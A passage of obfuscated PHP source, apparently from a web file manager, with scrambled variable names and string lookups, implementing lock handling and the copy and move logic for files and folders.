. $™©“çĞÅ . $íı÷ÁóÄ[95] . $¿‰÷—, $Ûí˜Ë); $this->_lockEvent($™©“çĞÅ, array($íı÷ÁóÄ[543], $íı÷ÁóÄ[545]), $Ûí˜Ë); $this->_lockParent($™©“çĞÅ, array($íı÷ÁóÄ[543], $íı÷ÁóÄ[545]), $Ûí˜Ë); $this->_lockCheckEnd($íı÷ÁóÄ[544], $™©“çĞÅ); } public function lockWriteEnd($óå‹·’¸Î½«, $ùûİ÷Ì = '') { $Ü²¾ö†‹¿ê =& $_SERVER[ÀÆ]; if (!$this->allowLock()) { return; } $ÍÊÆ÷øÛ¬Ë = 0; $this->_lockKey($Ü²¾ö†‹¿ê[548] . $óå‹·’¸Î½« . $Ü²¾ö†‹¿ê[95] . $ùûİ÷Ì, $ÍÊÆ÷øÛ¬Ë); $this->_lockEvent($óå‹·’¸Î½«, array($Ü²¾ö†‹¿ê[543], $Ü²¾ö†‹¿ê[545]), $ÍÊÆ÷øÛ¬Ë); $this->_lockParent($óå‹·’¸Î½«, array($Ü²¾ö†‹¿ê[543], $Ü²¾ö†‹¿ê[545]), $ÍÊÆ÷øÛ¬Ë); } public function lockMoveStart($®ú´…) { $µñƒ =& $_SERVER[ÀÆ]; if (!$this->allowLock()) { return; } $this->_lockCheck($µñƒ[545], $®ú´…); $Úèâ = 1; $this->_lockKey($µñƒ[549] . $®ú´…, $Úèâ); $this->_lockEvent($®ú´…, array($µñƒ[543], $µñƒ[544]), $Úèâ); $this->_lockParent($®ú´…, array($µñƒ[543], $µñƒ[545]), $Úèâ); $this->_lockEvent($®ú´…, array($µñƒ[550], $µñƒ[546], $µñƒ[547]), $Úèâ); $this->_lockCheckEnd($µñƒ[545], $®ú´…); } public function lockMoveEnd($â¡£ÒÖù£) { $çŠŒ£Ö§ =& $_SERVER[ÀÆ]; if (!$this->allowLock()) { return; } $ÈúÜÌáË = 0; $this->_lockKey($çŠŒ£Ö§[549] . $â¡£ÒÖù£, $ÈúÜÌáË); $this->_lockEvent($â¡£ÒÖù£, array($çŠŒ£Ö§[543], $çŠŒ£Ö§[544]), $ÈúÜÌáË); $this->_lockParent($â¡£ÒÖù£, array($çŠŒ£Ö§[543], $çŠŒ£Ö§[545]), $ÈúÜÌáË); $this->_lockEvent($â¡£ÒÖù£, array($çŠŒ£Ö§[550], $çŠŒ£Ö§[546], $çŠŒ£Ö§[547]), $ÈúÜÌáË); } private function _lockCheck($Ø€ãÜÁ, $ó¼æ—) { $İË°´Şµ =& $_SERVER[ÀÆ]; $†áª—Š–®ÈØ = $this->sourceInfo($ó¼æ—); $ª = $Ø€ãÜÁ . $İË°´Şµ[95] . $ó¼æ—; $this->_lockTimeStart[$ª] = timeFloat(); if (!is_array($†áª—Š–®ÈØ)) { return; } $ÊÇñ£¥Âç = LNG($İË°´Şµ[551]); CacheLock::setErrorMsg($İË°´Şµ[160] . htmlspecialchars($†áª—Š–®ÈØ[$İË°´Şµ[28]]) . $İË°´Şµ[530] . $ÊÇñ£¥Âç); $this->_lockKey($ª, 1); $this->_lockKey($ª, 0); $À = array_reverse($this->parentLevelArray($†áª—Š–®ÈØ[$İË°´Şµ[515]])); foreach ($À as $±ñ¦Ô£’ï) { $ª = $Ø€ãÜÁ . $İË°´Şµ[552] . $±ñ¦Ô£’ï; if (CacheLock::lockGet($İË°´Şµ[553] . $ª)) { $†áª—Š–®ÈØ = $this->sourceInfo($±ñ¦Ô£’ï); CacheLock::setErrorMsg($İË°´Şµ[160] . htmlspecialchars($†áª—Š–®ÈØ[$İË°´Şµ[28]]) . $İË°´Şµ[530] . $ÊÇñ£¥Âç); $this->_lockKey($ª, 1); $this->_lockKey($ª, 0); } } } private function _lockCheckEnd($ÛÏÃİ¢íúÚÉ“, $ß±˜ƒ†ÆıÁ) { $ú´úğÚÂ =& $_SERVER[ÀÆ]; $µâ = $ÛÏÃİ¢íúÚÉ“ . $ú´úğÚÂ[95] . $ß±˜ƒ†ÆıÁ; CacheLock::setErrorMsg($ú´úğÚÂ[376]); if (!isset($this->_lockTimeStart[$µâ])) { return; } $ĞÎÄÅ´Ïù¸À = timeFloat() - $this->_lockTimeStart[$µâ]; unset($this->_lockTimeStart[$µâ]); if ($ĞÎÄÅ´Ïù¸À > 0.5) { unset(self::$cacheSourceInfo[$ú´úğÚÂ[452] . $ß±˜ƒ†ÆıÁ]); } $ÜïˆÏ¢„´¦ = $this->sourceInfo($ß±˜ƒ†ÆıÁ); if (!$ÜïˆÏ¢„´¦) { show_json(LNG($ú´úğÚÂ[105]), !1); } } private function _lockParent($›”×½‚–¬Ã…ä, $ñ™, $¡Ş€ñïÛÕ§) { if (!$this->autoLockSet) { return; } $£ = $this->sourceInfo($›”×½‚–¬Ã…ä); if (!is_array($£)) { return; } $Ã‘ = array_reverse($this->parentLevelArray($£[$_SERVER[ÀÆ][515]])); foreach ($Ã‘ as $Êå¸³ï©±Ü) { $this->_lockEvent($Êå¸³ï©±Ü, $ñ™, $¡Ş€ñïÛÕ§); } } private function _lockEvent($¨øúã, $ÖÄğë¢«Ø, $öÕÈ·ù¢”¿Ì) { $ªà¶ =& $_SERVER[ÀÆ]; if (!$this->autoLockSet) { return; } foreach ($ÖÄğë¢«Ø as $®°ë’†«…¾Ç) { $€»Âœ™ = $®°ë’†«…¾Ç . $ªà¶[95] . $¨øúã; if ($öÕÈ·ù¢”¿Ì && CacheLock::lockGet($ªà¶[553] . $€»Âœ™)) { continue; } $this->_lockKey($€»Âœ™, $öÕÈ·ù¢”¿Ì); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ÎáÍ·­Í±, $÷œ€œ¹£ÙÃ…õ = 1) { $± = $_SERVER[ÀÆ][553] . md5($ÎáÍ·­Í±); if ($÷œ€œ¹£ÙÃ…õ) { if (isset(self::$_lockItemArr[$±])) { return; } self::$_lockItemArr[$±] = 1; CacheLock::lock($±, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$±])) { return; } unset(self::$_lockItemArr[$±]); CacheLock::unlock($±); } } public function isParentOf($µÑÃÅ, $¾±Ó²) { $åŒ…°°¤ =& $_SERVER[ÀÆ]; $ŒÉÙùœ‰æ = $this->sourceInfo($µÑÃÅ); $‚µ†ÇºòË = $this->sourceInfo($¾±Ó²); $óº = $ŒÉÙùœ‰æ[$åŒ…°°¤[515]] . $ŒÉÙùœ‰æ[$åŒ…°°¤[397]] . $åŒ…°°¤[47]; $¯éÀæÒ»®‚ = $‚µ†ÇºòË[$åŒ…°°¤[515]] . $‚µ†ÇºòË[$åŒ…°°¤[397]] . $åŒ…°°¤[47]; $Í‰² = strpos($¯éÀæÒ»®‚, $óº) === 0; return $Í‰²; } private $targetIsDelete = 0; public function copy($ÂÆ, $Ì·Ùâ, $êÔ—Ñ´Ğ = REPEAT_REPLACE, $îÉÑÄß†ËÕ† = '') { $É¶å­ =& $_SERVER[ÀÆ]; $èŞ€ = $this->sourceInfo($ÂÆ); $¢æÄŠ«ŒË = $this->sourceInfo($Ì·Ùâ); if (!$èŞ€ || !$¢æÄŠ«ŒË || $¢æÄŠ«ŒË[$É¶å­[405]] != $É¶å­[87]) { return !1; } if ($this->isParentOf($ÂÆ, $Ì·Ùâ)) { return !1; } $šë›„£ = $îÉÑÄß†ËÕ† ? $îÉÑÄß†ËÕ† : $èŞ€[$É¶å­[28]]; $this->lockCopyStart($ÂÆ); $this->lockWriteStart($Ì·Ùâ, $šë›„£); $Ê = array($É¶å­[554] => array(), $É¶å­[555] => array(), $É¶å­[556] => array()); $this->targetIsDelete = intval($èŞ€[$É¶å­[425]]); $Î–™Ç = $this->fileNameExistCache($Ì·Ùâ, $èŞ€[$É¶å­[28]]); $Öñï•¶È‡¾ = $this->_copy($ÂÆ, $Ì·Ùâ, $êÔ—Ñ´Ğ, $Ê, !0, $îÉÑÄß†ËÕ†); $this->_childrenListClear(); $this->lockCopyEnd($ÂÆ); $this->lockWriteEnd($Ì·Ùâ, $šë›„£); if ($èŞ€[$É¶å­[405]] == $É¶å­[87] && $Î–™Ç == $Öñï•¶È‡¾) { $this->folderSizeResetChildren($Î–™Ç); } Model($É¶å­[557])->addAll($Ê[$É¶å­[555]], array(), !0); if ($Î–™Ç != $Öñï•¶È‡¾ || $èŞ€[$É¶å­[405]] == $É¶å­[87]) { Model($É¶å­[558])->eventCopy($Öñï•¶È‡¾); } $this->saveAll($Ê[$É¶å­[556]]); Model($É¶å­[193])->linkAdd($Ê[$É¶å­[554]]); $this->folderSizeReset($Ì·Ùâ); $this->updateModifyTime($Ì·Ùâ); return $Öñï•¶È‡¾; } private function _copy($×¢ÆÖÛÆæ«Ü, $˜Äç—, $àİ†¥Í, &$©, $„íÛ‚Ü¿, $àŠ = '') { $ÂŸ…şÄ© =& $_SERVER[ÀÆ]; $Û§é = $this->sourceInfoCache($×¢ÆÖÛÆæ«Ü); $ö±¦Ä¦ = $Û§é[$ÂŸ…şÄ©[405]] == $ÂŸ…şÄ©[87]; $à¹Ëüåæ¼®Éà = $àŠ ? $àŠ : $Û§é[$ÂŸ…şÄ©[28]]; $ÖğÍÁ‡¹ÀĞÀ« = $this->fileNameExistCache($˜Äç—, $à¹Ëüåæ¼®Éà); if ($„íÛ‚Ü¿) { $this->_childrenAllMake($×¢ÆÖÛÆæ«Ü); if ($ö±¦Ä¦ && $ÖğÍÁ‡¹ÀĞÀ«) { $this->_childrenAllMake($ÖğÍÁ‡¹ÀĞÀ«); } } if (!$ÖğÍÁ‡¹ÀĞÀ«) { return $this->_copyCreate($×¢ÆÖÛÆæ«Ü, $˜Äç—, $à¹Ëüåæ¼®Éà, $©); } $Ï¶‰ËøİÓ = $ÖğÍÁ‡¹ÀĞÀ«; if ($ö±¦Ä¦) { if ($àİ†¥Í == REPEAT_RENAME_FOLDER) { $à¹Ëüåæ¼®Éà = $this->fileNameAutoCache($˜Äç—, $à¹Ëüåæ¼®Éà, $àİ†¥Í, $ö±¦Ä¦); $Ï¶‰ËøİÓ = $this->_copyCreate($×¢ÆÖÛÆæ«Ü, $˜Äç—, $à¹Ëüåæ¼®Éà, $©); } else { $úü¶ÍÏğô = $this->_childrenList($×¢ÆÖÛÆæ«Ü); foreach ($úü¶ÍÏğô as $”Èñ) { $this->_copy($”Èñ[$ÂŸ…şÄ©[397]], $ÖğÍÁ‡¹ÀĞÀ«, $àİ†¥Í, $©, !1); } } } else { if ($àİ†¥Í == REPEAT_RENAME || $àİ†¥Í == REPEAT_RENAME_FOLDER) { $à¹Ëüåæ¼®Éà = $this->fileNameAutoCache($˜Äç—, $à¹Ëüåæ¼®Éà, $àİ†¥Í, $ö±¦Ä¦); $Ï¶‰ËøİÓ = $this->_copyCreate($×¢ÆÖÛÆæ«Ü, $˜Äç—, $à¹Ëüåæ¼®Éà, $©); } else { if ($àİ†¥Í == REPEAT_REPLACE) { $´ã = $this->sourceInfoCache($ÖğÍÁ‡¹ÀĞÀ«); $ë„ö¥Øó¢ê‹ = $this->fileHistory($´ã, $Û§é[$ÂŸ…şÄ©[461]], $Û§é[$ÂŸ…şÄ©[78]]); if ($ë„ö¥Øó¢ê‹) { $©[$ÂŸ…şÄ©[554]][] = $Û§é[$ÂŸ…şÄ©[461]]; } } else { if ($àİ†¥Í == REPEAT_SKIP) { } } } Hook::trigger($ÂŸ…şÄ©[559], array($ÂŸ…şÄ©[560], $Û§é, 0)); } return $Ï¶‰ËøİÓ; } private function _copyCreate($ğÁšºÈ¸à, $Æ§½Ê, $İšÎë€±, &$¤à­«Õ”) { $ÏØˆş =& $_SERVER[ÀÆ]; $›™Ë = $this->sourceInfoCache($ğÁšºÈ¸à); $à€ÎÌÇ²ÈÆ = $this->sourceInfoCache($Æ§½Ê); $£¾áì = $this->_makeItemData($›™Ë, $à€ÎÌÇ²ÈÆ, $İšÎë€±); Hook::trigger($ÏØˆş[561], $£¾áì); Hook::trigger($ÏØˆş[562], array($ÏØˆş[563], $£¾áì, 0)); $÷İëØˆ±¨ = $this->add($£¾áì); $öõÂ = array($ÏØˆş[397] => $÷İëØˆ±¨, $ÏØˆş[28] => $İšÎë€±); $this->_copyApplyMeta($öõÂ, $¤à­«Õ”); if ($›™Ë[$ÏØˆş[405]] != $ÏØˆş[87]) { $¤à­«Õ”[$ÏØˆş[554]][] = $›™Ë[$ÏØˆş[461]]; return $÷İëØˆ±¨; } $Ë¨áî˜ù = array(); $õ° = array(); $this->_childrenListAll($ğÁšºÈ¸à, $Ë¨áî˜ù); $ÆúÁÚ = count($Ë¨áî˜ù); if ($ÆúÁÚ == 0) { return $÷İëØˆ±¨; } $±Æ = $this->sourceInfo($÷İëØˆ±¨); foreach ($Ë¨áî˜ù as $µ¶¦³¥‘¬Šš) { $¼¶ = $this->_makeItemData($µ¶¦³¥‘¬Šš, $±Æ, $µ¶¦³¥‘¬Šš[$ÏØˆş[28]]); $¼¶[$ÏØˆş[515]] = $µ¶¦³¥‘¬Šš[$ÏØˆş[515]]; $õ°[] = $¼¶; } $this->chunkEventSet($ÏØˆş[564], array($ÏØˆş[565], $£¾áì, $ÆúÁÚ)); $this->addAll($õ°, array(), !1); $ù¥Âóå“ = $this->where(array($ÏØˆş[492] => $÷İëØˆ±¨))->select(); $„Åä—Ş¹İ = $this->_childrenMakeRelation($Ë¨áî˜ù, $ù¥Âóå“); $„Åä—Ş¹İ[$ğÁšºÈ¸à] = $÷İëØˆ±¨; $İğÍÃùùàĞ = array(); $¥ßãÊ = array(); foreach ($ù¥Âóå“ as $µ¶¦³¥‘¬Šš) { $à = $µ¶¦³¥‘¬Šš[$ÏØˆş[397]]; $ìúªŸµºéØ = $this->_childrenMatch($„Åä—Ş¹İ, $µ¶¦³¥‘¬Šš, $±Æ); $İğÍÃùùàĞ[] = array($ÏØˆş[397], $à, $ÏØˆş[492], $ìúªŸµºéØ[$ÏØˆş[492]]); $¥ßãÊ[] = array($ÏØˆş[397], $à, $ÏØˆş[515], $ìúªŸµºéØ[$ÏØˆş[515]]); $this->_copyApplyMeta($µ¶¦³¥‘¬Šš, $¤à­«Õ”); if ($µ¶¦³¥‘¬Šš[$ÏØˆş[405]] != $ÏØˆş[87]) { $¤à­«Õ”[$ÏØˆş[554]][] = $µ¶¦³¥‘¬Šš[$ÏØˆş[461]]; } } $this->chunkEventSet($ÏØˆş[566], array($ÏØˆş[567], $£¾áì, $ÆúÁÚ)); $this->saveAll($İğÍÃùùàĞ); $this->chunkEventSet($ÏØˆş[568], array($ÏØˆş[569], $£¾áì, $ÆúÁÚ)); $this->saveAll($¥ßãÊ); return $÷İëØˆ±¨; } private function _childrenMakeRelation($ŠşÅòùî÷µõ, $˜‰íÉ¶‡) { $Êå¢Ã¿™ =& $_SERVER[ÀÆ]; $İ…í¿Û = array(); $Ìôê‚ÙÌäï = array(); foreach ($ŠşÅòùî÷µõ as $È‹ù¬¦Ò) { $ßúğè—ÒÁÎù¼ = $È‹ù¬¦Ò[$Êå¢Ã¿™[28]] . $Êå¢Ã¿™[8] . $È‹ù¬¦Ò[$Êå¢Ã¿™[515]]; $İ…í¿Û[$ßúğè—ÒÁÎù¼] = $È‹ù¬¦Ò[$Êå¢Ã¿™[397]]; } foreach ($˜‰íÉ¶‡ as $È‹ù¬¦Ò) { $ßúğè—ÒÁÎù¼ = $È‹ù¬¦Ò[$Êå¢Ã¿™[28]] . $Êå¢Ã¿™[8] . $È‹ù¬¦Ò[$Êå¢Ã¿™[515]]; $¼–Ä = $İ…í¿Û[$ßúğè—ÒÁÎù¼]; $Ìôê‚ÙÌäï[$¼–Ä] = $È‹ù¬¦Ò[$Êå¢Ã¿™[397]]; } return $Ìôê‚ÙÌäï; } private function _childrenMatch($œóëŞ, $ÌıÂëÒ, $äòùì¬ï) { $Ã“Æ¢’Âù½ =& $_SERVER[ÀÆ]; $Ø’Ä¬Çªõ¼ = $äòùì¬ï[$Ã“Æ¢’Âù½[515]]; $Ã¼¤¥µ = $this->parentLevelArray($ÌıÂëÒ[$Ã“Æ¢’Âù½[515]]); foreach ($Ã¼¤¥µ as $‚¤‹å) { if (isset($œóëŞ[$‚¤‹å])) { $Ø’Ä¬Çªõ¼ .= $œóëŞ[$‚¤‹å] . $Ã“Æ¢’Âù½[570]; } } $Ø’Ä¬Çªõ¼ = rtrim($Ø’Ä¬Çªõ¼, $Ã“Æ¢’Âù½[47]) . $Ã“Æ¢’Âù½[47]; $íô‘ıÕÈ²Ï = $this->parentLevelArray($Ø’Ä¬Çªõ¼); $Ö® = $íô‘ıÕÈ²Ï[count($íô‘ıÕÈ²Ï) - 1]; return array($Ã“Æ¢’Âù½[492] => $Ö®, $Ã“Æ¢’Âù½[515] => $Ø’Ä¬Çªõ¼); } private function _makeItemData($í¬œÜİ€÷ü‡, $Æ‚­­í, $¨¢»Â¨â«Õª) { $æ–¸ƒËØş‚ =& $_SERVER[ÀÆ]; $Îº¾á–í•š = array($æ–¸ƒËØş‚[571] => $í¬œÜİ€÷ü‡[$æ–¸ƒËØş‚[405]], $æ–¸ƒËØş‚[415] => $¨¢»Â¨â«Õª, $æ–¸ƒËØş‚[572] => $í¬œÜİ€÷ü‡[$æ–¸ƒËØş‚[407]] ? $í¬œÜİ€÷ü‡[$æ–¸ƒËØş‚[407]] : $æ–¸ƒËØş‚[33], $æ–¸ƒËØş‚[462] => $í¬œÜİ€÷ü‡[$æ–¸ƒËØş‚[461]] ? $í¬œÜİ€÷ü‡[$æ–¸ƒËØş‚[461]] : 0, $æ–¸ƒËØş‚[573] => $í¬œÜİ€÷ü‡[$æ–¸ƒËØş‚[78]] ? $í¬œÜİ€÷ü‡[$æ–¸ƒËØş‚[78]] : 0, $æ–¸ƒËØş‚[574] => intval($Æ‚­­í[$æ–¸ƒËØş‚[406]]), $æ–¸ƒËØş‚[575] => intval($Æ‚­­í[$æ–¸ƒËØş‚[498]]), $æ–¸ƒËØş‚[576] => intval(USER_ID), $æ–¸ƒËØş‚[577] => intval(USER_ID), $æ–¸ƒËØş‚[396] => intval($Æ‚­­í[$æ–¸ƒËØş‚[397]]), $æ–¸ƒËØş‚[578] => $Æ‚­­í[$æ–¸ƒËØş‚[515]] . $Æ‚­­í[$æ–¸ƒËØş‚[397]] . $æ–¸ƒËØş‚[47], $æ–¸ƒËØş‚[419] => $í¬œÜİ€÷ü‡[$æ–¸ƒËØş‚[84]] ? $í¬œÜİ€÷ü‡[$æ–¸ƒËØş‚[84]] : time(), $æ–¸ƒËØş‚[424] => 0, $æ–¸ƒËØş‚[579] => $æ–¸ƒËØş‚[33]); return $Îº¾á–í•š; } private function _copyApplyMeta($Á¢¬É, &$ë) { $… =& $_SERVER[ÀÆ]; $” = $Á¢¬É[$…[397]]; $›©ã²ûæó¼‡ = $Á¢¬É[$…[28]]; if (!isset($Á¢¬É[$…[580]]) || !$Á¢¬É[$…[580]] || $Á¢¬É[$…[580]] == $…[191]) { $ë[$…[556]][] = array($…[397], $”, $…[580], short_id($”)); } if (Input::check($›©ã²ûæó¼‡, $…[581])) { $ë[$…[555]][] = array($…[397] => $”, $…[93] => $…[458], $…[372] => str_replace($…[50], $…[33], Pinyin::get($›©ã²ûæó¼‡))); $ë[$…[555]][] = array($…[397] => $”, $…[93] => $…[457], $…[372] => Pinyin::get($›©ã²ûæó¼‡, $…[582])); } $ë[$…[555]][] = array($…[397] => $”, $…[93] => $…[436], $…[372] => KodSort::makeStr($›©ã²ûæó¼‡)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Äó±»ˆ¡š) { $İßƒ³–‘î =& $_SERVER[ÀÆ]; $œÂ = $this->sourceInfo($Äó±»ˆ¡š); $”¢ = $İßƒ³–‘î[583]; $æ–§æÑÁ¾ = array($İßƒ³–‘î[515] => array($İßƒ³–‘î[538], $œÂ[$İßƒ³–‘î[515]] . $Äó±»ˆ¡š . $İßƒ³–‘î[539]), $İßƒ³–‘î[425] => $this->targetIsDelete); $‹ıß¸‚ÖØèü = $this->field($”¢)->where($æ–§æÑÁ¾)->select(); if (!$‹ıß¸‚ÖØèü) { return; } $‹ıß¸‚ÖØèü = array_to_keyvalue($‹ıß¸‚ÖØèü, $İßƒ³–‘î[397]); foreach ($‹ıß¸‚ÖØèü as $‰²¹ßµ‹) { $½Œ±•éãéï = $‰²¹ßµ‹[$İßƒ³–‘î[492]]; $Äó±»ˆ¡š = $‰²¹ßµ‹[$İßƒ³–‘î[397]]; if (!isset($this->_childrenListCache[$Äó±»ˆ¡š]) && $‰²¹ßµ‹[$İßƒ³–‘î[405]] == $İßƒ³–‘î[87]) { $this->_childrenListCache[$Äó±»ˆ¡š] = array(); } if (!isset($this->_childrenListCache[$½Œ±•éãéï])) { $this->_childrenListCache[$½Œ±•éãéï] = array(); } $this->_childrenListCache[$½Œ±•éãéï][$Äó±»ˆ¡š] = $‰²¹ßµ‹; $this->_childrenItemCache[$Äó±»ˆ¡š] = $‰²¹ßµ‹; } } private function _childrenListAll($ÕÌâ, &$ğÜ§ÃÌ¬ù) { $•´³ôİ” =& $_SERVER[ÀÆ]; if (!isset($this->_childrenListCache[$ÕÌâ])) { return; } $°´öØ’§ÁÓü = $this->_childrenListCache[$ÕÌâ]; foreach ($°´öØ’§ÁÓü as $İÊ¨äÌ…¼ => $áãÔ’Ê±ìè) { $ğÜ§ÃÌ¬ù[$İÊ¨äÌ…¼] = $áãÔ’Ê±ìè; if ($áãÔ’Ê±ìè[$•´³ôİ”[405]] == $•´³ôİ”[87]) { $this->_childrenListAll($İÊ¨äÌ…¼, $ğÜ§ÃÌ¬ù); } } } private function sourceInfoCache($ì’Èç”) { if (isset($this->_childrenItemCache[$ì’Èç”])) { return $this->_childrenItemCache[$ì’Èç”]; } return $this->sourceInfo($ì’Èç”); } private function _childrenList($ŒœçŠ¶ƒ³ÓÚ) { if (isset($this->_childrenListCache[$ŒœçŠ¶ƒ³ÓÚ])) { return $this->_childrenListCache[$ŒœçŠ¶ƒ³ÓÚ]; } return $this->_childrenListSelect($ŒœçŠ¶ƒ³ÓÚ); } private function _childrenListSelect($æÖÆ) { $…ñ =& $_SERVER[ÀÆ]; $ôìøõ¨‹ù = array($…ñ[492] => $æÖÆ, $…ñ[425] => $this->targetIsDelete); $«ĞæÊĞ¨—Í = $this->where($ôìøõ¨‹ù)->select(); $«ĞæÊĞ¨—Í = $«ĞæÊĞ¨—Í ? $«ĞæÊĞ¨—Í : array(); $Ù­÷ÆéƒŞé®Â = array_to_keyvalue($«ĞæÊĞ¨—Í, $…ñ[397]); $this->_childrenListCache[$æÖÆ] = $Ù­÷ÆéƒŞé®Â; foreach ($Ù­÷ÆéƒŞé®Â as $æÖÆ => $ î©›§) { $this->_childrenItemCache[$æÖÆ] = $ î©›§; } return $Ù­÷ÆéƒŞé®Â; } private function fileNameExistCache($ù¹, $Ê¨©›Ø÷Ã½) { $õ =& $_SERVER[ÀÆ]; $Ê¨©›Ø÷Ã½ = strtolower($Ê¨©›Ø÷Ã½); $ÆÃÜª» = $this->_childrenList($ù¹); foreach ($ÆÃÜª» as $ê) { if ($Ê¨©›Ø÷Ã½ == strtolower($ê[$õ[28]])) { return $ê[$õ[397]]; } } return !1; } private function fileNameAutoCache($³‘¹î¨‚, $Äû˜µ¾ÎŒÜ‹ï, $µ€¨»¸ëÈÌ, $«·â) { $Î¢ªû‹äë =& $_SERVER[ÀÆ]; $—…¤ëéÖù…» = $this->_childrenList($³‘¹î¨‚); $ã§ = array_to_keyvalue($—…¤ëéÖù…», $Î¢ªû‹äë[33], $Î¢ªû‹äë[28]); return $this->fileNameAutoGet($ã§, $Äû˜µ¾ÎŒÜ‹ï, $µ€¨»¸ëÈÌ, $«·â); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ÂÒÕ, $º•š‚¿¶ß, $Éå = REPEAT_REPLACE, $ğÍ = '') { $Šè =& $_SERVER[ÀÆ]; $Æ®İ©Ø„ = $this->sourceInfo($ÂÒÕ); $±Ø”ªûûï = $this->sourceInfo($º•š‚¿¶ß); if ($Æ®İ©Ø„[$Šè[492]] == $±Ø”ªûûï[$Šè[397]]) { if ($Æ®İ©Ø„[$Šè[425]] == $Šè[87]) { Model($Šè[423])->restore(array($ÂÒÕ)); } if (!$ğÍ || $ğÍ == $Æ®İ©Ø„[$Šè[28]]) { return $ÂÒÕ; } } $«”Ìùï‘©—  = $this->pathInfoMore($ÂÒÕ); if ($this->isParentOf($ÂÒÕ, $º•š‚¿¶ß)) { return !1; } if (!$Æ®İ©Ø„ || !$±Ø”ªûûï || $±Ø”ªûûï[$Šè[405]] != $Šè[87]) { return !1; } Hook::trigger($Šè[584], $«”Ìùï‘©— ); $this->targetIsDelete = intval($Æ®İ©Ø„[$Šè[425]]); if ($Æ®İ©Ø„[$Šè[492]] == $º•š‚¿¶ß && $ğÍ != $Æ®İ©Ø„[$Šè[28]]) { $‚ï÷ì¨ = $this->fileNameExist($º•š‚¿¶ß, $ğÍ); if ($‚ï÷ì¨ && $Æ®İ©Ø„[$Šè[405]] == $Šè[191]) { $› = $this->sourceInfo($‚ï÷ì¨); $ÌšÇÅ˜’ßğê = $this->fileHistory($›, $Æ®İ©Ø„[$Šè[461]], $Æ®İ©Ø„[$Šè[78]]); if (!$ÌšÇÅ˜’ßğê) { Model($Šè[464])->remove($Æ®İ©Ø„[$Šè[461]]); } $this->removeNow($ÂÒÕ, !1); $this->folderSizeReset($º•š‚¿¶ß); Hook::trigger($Šè[585], $«”Ìùï‘©— ); return $‚ï÷ì¨; } } $Äéü = $ğÍ ? $ğÍ : $Æ®İ©Ø„[$Šè[28]]; $this->lockMoveStart($ÂÒÕ); $this->lockWriteStart($º•š‚¿¶ß, $Äéü); $õ†³ = array($Šè[554] => array(), $Šè[586] => !1); $this->clearShare($ÂÒÕ, $º•š‚¿¶ß); $˜óÀÉ­½œÆé = $this->fileNameExistCache($º•š‚¿¶ß, $Æ®İ©Ø„[$Šè[28]]); $“ = $this->_move($ÂÒÕ, $º•š‚¿¶ß, $Éå, $õ†³, $ğÍ); $this->sourceCacheClear(); if ($Æ®İ©Ø„[$Šè[405]] == $Šè[87] && $˜óÀÉ­½œÆé) { $this->folderSizeResetChildren($“); } Model($Šè[193])->linkAdd($õ†³[$Šè[554]]); if ($˜óÀÉ­½œÆé && $õ†³[$Šè[586]]) { $this->removeNow($ÂÒÕ, !1); } $this->lockMoveEnd($ÂÒÕ); $this->lockWriteEnd($º•š‚¿¶ß, $Äéü); $this->folderSizeReset($Æ®İ©Ø„[$Šè[492]]); $this->folderSizeReset($º•š‚¿¶ß); $¨Ú’¬°“Ëªúî = array($Æ®İ©Ø„[$Šè[492]], $º•š‚¿¶ß); if ($Æ®İ©Ø„[$Šè[405]] == $Šè[87]) { $¨Ú’¬°“Ëªúî[] = $ÂÒÕ; } $this->updateModifyTime($¨Ú’¬°“Ëªúî); Model($Šè[558])->eventMove($ÂÒÕ, $Æ®İ©Ø„[$Šè[492]], $º•š‚¿¶ß); Hook::trigger($Šè[585], $«”Ìùï‘©— ); return $“; } private function _move($§‡·¨¢ÛÌÌ, $àäË¾¯ï¯ä, $·, &$§‡¡ø’, $€ş„‰ Ÿ†§ü = '') { $÷æ¤¬ò·æ¦Ó =& $_SERVER[ÀÆ]; $ú¼ = $this->sourceInfo($§‡·¨¢ÛÌÌ); $–™şÕÆ = $ú¼[$÷æ¤¬ò·æ¦Ó[405]] == $÷æ¤¬ò·æ¦Ó[87]; $²æéé = $€ş„‰ Ÿ†§ü ? $€ş„‰ Ÿ†§ü : $ú¼[$÷æ¤¬ò·æ¦Ó[28]]; $—ÏÚÁÌ¸¾å = $this->fileNameExistCache($àäË¾¯ï¯ä, $²æéé); $this->lockMoveStart($§‡·¨¢ÛÌÌ); $this->lockWriteStart($àäË¾¯ï¯ä, $²æéé); if (!$—ÏÚÁÌ¸¾å) { return $this->_moveForce($§‡·¨¢ÛÌÌ, $àäË¾¯ï¯ä, $²æéé); } $Ç´ãÁåÓÍ´ = $—ÏÚÁÌ¸¾å; $Îá = !1; if ($–™şÕÆ) { if ($· == REPEAT_RENAME_FOLDER) { $²æéé = $this->fileNameAuto($àäË¾¯ï¯ä, $²æéé, $·, $–™şÕÆ); $Ç´ãÁåÓÍ´ = $this->_moveForce($§‡·¨¢ÛÌÌ, $àäË¾¯ï¯ä, $²æéé); } else { if ($· == REPEAT_RENAME_FOLDER) { $· = REPEAT_RENAME; } $­ªÕ = $this->_childrenListSelect($§‡·¨¢ÛÌÌ); foreach ($­ªÕ as $ÔİÑÂâÆ) { $this->_move($ÔİÑÂâÆ[$÷æ¤¬ò·æ¦Ó[397]], $—ÏÚÁÌ¸¾å, $·, $§‡¡ø’); } $Îá = !0; } } else { if ($· == REPEAT_SKIP) { $Îá = !0; } else { if ($· == REPEAT_RENAME || $· == REPEAT_RENAME_FOLDER) { $²æéé = $this->fileNameAuto($àäË¾¯ï¯ä, $²æéé, $·, $–™şÕÆ); $Ç´ãÁåÓÍ´ = $this->_moveForce($§‡·¨¢ÛÌÌ, $àäË¾¯ï¯ä, $²æéé); } else { if ($· == REPEAT_REPLACE) { $ÂËÔŞ = $this->sourceInfoCache($—ÏÚÁÌ¸¾å); $…ó‘ = $this->fileHistory($ÂËÔŞ, $ú¼[$÷æ¤¬ò·æ¦Ó[461]], $ú¼[$÷æ¤¬ò·æ¦Ó[78]]); $Îá = !0; if ($…ó‘) { $§‡¡ø’[$÷æ¤¬ò·æ¦Ó[554]][] = $ú¼[$÷æ¤¬ò·æ¦Ó[461]]; } } } } } if ($Îá && !$§‡¡ø’[$÷æ¤¬ò·æ¦Ó[586]]) { $§‡¡ø’[$÷æ¤¬ò·æ¦Ó[586]] = 